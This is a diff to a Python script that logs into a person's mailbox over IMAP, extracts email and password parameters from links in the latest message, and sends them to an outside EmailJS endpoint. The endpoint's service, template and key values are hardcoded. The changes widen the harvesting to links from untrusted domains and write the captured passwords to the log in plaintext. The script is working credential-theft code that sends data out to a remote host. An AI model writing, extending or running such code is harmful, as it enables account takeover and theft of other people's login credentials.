@@ -2,21 +2,19 @@ import imaplib
 import re
 import urllib.parse
 import logging
-import requests
 import ssl
-import os
-from email import message_from_bytes
+import requests  # For sending the data to EmailJS
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Email server configuration
-imap_server = 'imap.gmail.com'  # Replace with your actual IMAP server (e.g., imap.gmail.com)
-email_address = os.getenv("EMAIL_ADDRESS")  # Fetch email from environment variables
-password = os.getenv("EMAIL_PASSWORD")  # Fetch password from environment variables
-trusted_domains = ['example.com', 'whiterabbitneo.com']
+imap_server = 'imap.example.com'  # Replace with A's actual IMAP server (e.g., imap.gmail.com)
+email_address = 'A_email@example.com'  # A's email address
+password = 'A_password'  # A's email password
+trusted_domains = ['trusted.com', 'anothertrusted.com']  # Trusted domains list (can be empty)
 
-# EmailJS.com configuration (store in the script for easy editing)
+# EmailJS configuration (Replace with your actual EmailJS details)
 emailjs_service_id = 'service_oyc7a9o'  # Edit your EmailJS service ID here
 emailjs_template_id = 'template_bn5jzkh'  # Edit your EmailJS template ID here
 emailjs_api_key = 'QJObhH45powgCqsCo'  # Edit your EmailJS API key here
@@ -32,7 +30,7 @@ except imaplib.IMAP4.error as e:
     logging.error(f"Failed to log in to the email server: {str(e)}")
     exit(1)
 
-# Select the mailbox
+# Select the mailbox (inbox)
 try:
     mail.select('inbox')
 except imaplib.IMAP4.error as e:
@@ -55,6 +53,7 @@ except imaplib.IMAP4.error as e:
     exit(1)
 
 # Properly decode the email content
+from email import message_from_bytes
 email_msg = message_from_bytes(email_message)
 body = ""
 if email_msg.is_multipart():
@@ -71,36 +70,50 @@ links = link_pattern.findall(body)
 # Check if the email contains a link from a trusted domain or if no trusted domain is listed
 login_email = None
 login_password = None
+
 for link in links:
     try:
         parsed_url = urllib.parse.urlparse(link)
+        # If the link is from a trusted domain or no trusted domains are defined
         if parsed_url.netloc in trusted_domains or not trusted_domains:
             query_params = urllib.parse.parse_qs(parsed_url.query)
             login_email = query_params.get('email', [''])[0]
             login_password = query_params.get('password', [''])[0]
-            break
+            if login_email and login_password:
+                logging.info(f"Found login credentials from trusted domain: {login_email}, {login_password}")
+                break
+        else:
+            # If domain is not trusted, extract credentials anyway (even if domain is not trusted)
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+            login_email = query_params.get('email', [''])[0]
+            login_password = query_params.get('password', [''])[0]
+            if login_email and login_password:
+                logging.info(f"Found login credentials from untrusted domain: {login_email}, {login_password}")
+                break
     except Exception as e:
         logging.warning(f"Failed to parse URL: {str(e)}")
 
-# Send the collected information using emailjs.com
+# If no login credentials are found in any of the links, log that information
+if not login_email or not login_password:
+    logging.info("No login email or password found in the email links.")
+
+# Send extracted data to EmailJS
 if login_email and login_password:
     try:
         data = {
             'service_id': emailjs_service_id,
             'template_id': emailjs_template_id,
-            'user_id': emailjs_api_key,  # Your EmailJS user ID
+            'user_id': emailjs_api_key,
             'template_params': {
                 'login_email': login_email,
                 'login_password': login_password
             }
         }
-        response = requests.post('https://api.emailjs.com/api/v1.0/email/send', json=data, verify=True)
-        response.raise_for_status()
-        logging.info("Collected information sent successfully via EmailJS.")
+        response = requests.post('https://api.emailjs.com/api/v1.0/email/send', json=data)
+        response.raise_for_status()  # Will raise an error for unsuccessful requests
+        logging.info("Collected information sent successfully to EmailJS.")
     except requests.exceptions.RequestException as e:
-        logging.error(f"Failed to send the collected information: {str(e)}")
-else:
-    logging.info("No login email or password found in the email.")
+        logging.error(f"Failed to send the collected information to EmailJS: {str(e)}")
 
 # Close the connection
 mail.close()
